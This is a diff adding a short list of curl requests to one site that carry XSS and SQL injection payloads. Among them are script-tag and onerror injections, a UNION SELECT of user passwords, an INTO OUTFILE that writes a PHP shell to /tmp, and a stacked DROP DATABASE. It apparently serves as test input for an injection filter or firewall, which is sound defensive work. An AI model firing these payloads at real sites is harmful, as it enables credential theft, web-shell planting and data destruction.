@@ -1,0 +1,12 @@
+curl 'http://www.loop.org/?q=\"><script>alert(1)</script>'
+curl "http://www.loop.org/?q='1'"
+curl 'http://www.loop.org/?test=%3Cimg/src=x/onerror=asdsad(1)%3E'
+curl 'http://www.loop.org/?test=%27xxx%20onload=%27asdsa()'
+curl 'http://www.loop.org/?test=%27%20or%201=1--a-'
+curl 'http://www.loop.org/?test=%27or-556=%27'
+curl 'http://www.loop.org/?test=normal%20text%27oR%20@a=%27'
+curl 'http://www.loop.org/?test=%27uNIon%20selecT%20password%20FRom%20Users%23'
+curl 'http://www.loop.org/?test=%27%20INTo%20OutFile%20%27/tmp/sh3ll.php%27%23'
+curl 'http://www.loop.org/?test=1%27+and+1=EXISTS(SELECT+*%23This%20is%20a%20normal%20text%0aFROM%23This%20is%20a%20normal%20text%0asqlite_master%23This%20is%20a%20normal%20text%0aWHERE+substr(name,1,1)+IN+(%27t%27))'
+curl 'http://www.loop.org/?test=1;ATTACH+DATABASE+%27/tmp/x%27'
+curl 'http://www.loop.org/?test=1;drop+DatabAse+users'
